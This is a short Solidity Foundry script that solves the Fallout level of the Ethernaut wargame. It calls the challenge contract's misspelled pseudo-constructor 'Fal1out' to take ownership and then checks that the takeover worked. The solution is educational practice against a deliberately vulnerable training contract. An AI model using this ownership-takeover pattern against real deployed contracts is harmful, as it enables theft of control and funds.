pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface IFallout {
    function owner() external view returns (address);

    function Fal1out() external payable;
}

contract Ethernaut02 is EthernautTest {
    function setUp() public {
        initialize(address(0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5));
    }

    function run() public {
        setUp();
        deploy();
        solve();
        submit(me);
    }

    function test() public {
        testMode = true;
        deploy();
        solve();
        submit(me);
    }

    function solve() internal {
        broadcastOrPrank();
        IFallout(instance).Fal1out();

        require(IFallout(instance).owner() == me, "not owner");
    }

    fallback() external payable {}
}
